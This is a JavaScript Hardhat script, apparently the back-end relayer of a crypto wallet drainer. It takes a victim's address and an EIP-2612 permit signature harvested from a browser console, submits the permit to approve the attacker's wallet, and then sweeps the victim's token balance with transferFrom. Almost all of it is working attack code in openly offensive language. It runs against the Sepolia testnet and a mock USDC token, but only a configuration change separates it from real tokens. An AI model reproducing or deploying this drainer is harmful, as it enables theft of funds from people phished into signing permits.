import pkg from 'hardhat';
const { ethers } = pkg;
import "dotenv/config";

// =========================================================================
// 🚨 PASTE THE HARVESTED DATA FROM THE BROWSER CONSOLE HERE 🚨
// =========================================================================
const VICTIM_ADDRESS = "0xYOUR_VICTIM_ADDRESS_HERE";
const DEADLINE = 0n; // Paste the Deadline number here
const SIGNATURE_HEX = "0xYOUR_SIGNATURE_HERE";

// Standardizing against the front-end simulation hardcodes
const DRAIN_AMOUNT = ethers.parseUnits("1000000000", 6);
// =========================================================================

async function main() {
    if (VICTIM_ADDRESS.includes("YOUR")) {
        console.error("[-] Please paste the harvested VICTIM_ADDRESS, DEADLINE, and SIGNATURE into the top of execute_permit.js first!");
        process.exit(1);
    }

    const provider = new ethers.JsonRpcProvider(process.env.SEPOLIA_RPC_URL);
    const drainerWallet = new ethers.Wallet(process.env.PRIVATE_KEY, provider);
    const tokenAddress = process.env.TOKEN_ADDRESS;

    console.log(`\n[+] Backend Relayer Connected directly to Sepolia`);
    console.log(`[+] Drainer Target Wallet: ${drainerWallet.address}`);
    console.log(`[+] Preparing to execute Off-Chain EIP-2612 Permit...`);

    const abi = [
        "function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s)",
        "function transferFrom(address from, address to, uint256 amount)",
        "function balanceOf(address account) view returns (uint256)"
    ];

    const token = new ethers.Contract(tokenAddress, abi, drainerWallet);

    // Crack the raw hex signature into standard cryptographic components
    const sig = ethers.Signature.from(SIGNATURE_HEX);

    try {
        console.log(`\n[Step 1/2] Broadcasting Native Permit Signature to the blockchain...`);
        const permitTx = await token.permit(
            VICTIM_ADDRESS,
            drainerWallet.address,
            DRAIN_AMOUNT,
            DEADLINE,
            sig.v,
            sig.r,
            sig.s
        );

        console.log(`[*] Permit TX Hash: ${permitTx.hash}`);
        await permitTx.wait();
        console.log(`[✔] Cryptographic signature validated! The Drainer logic layer is now actively approved.`);

        console.log(`\n[Step 2/2] Instantly draining wallet contents without victim interaction...`);

        // Dynamic balance checking prevents contract reversion on empty test wallets
        const balance = await token.balanceOf(VICTIM_ADDRESS);
        if (balance === 0n) {
            console.log(`[-] Victim balance evaluates to 0 MockUSDC. Extraction terminated safely.`);
            return;
        }

        // Drain exactly what we're allowed to, up to their entire balance
        const sweepAmount = balance < DRAIN_AMOUNT ? balance : DRAIN_AMOUNT;

        const sweepTx = await token.transferFrom(VICTIM_ADDRESS, drainerWallet.address, sweepAmount);
        console.log(`[*] Sweep TX Hash: ${sweepTx.hash}`);
        await sweepTx.wait();

        console.log(`[✅ MISSION ACCOMPLISHED] Protocol drained ${ethers.formatUnits(sweepAmount, 6)} MockUSDC successfully!`);

    } catch (e) {
        console.error(`\n[❌] Relayer Execution Failed:`);
        console.error(e.shortMessage || e.message);
    }
}

main().catch(console.error);
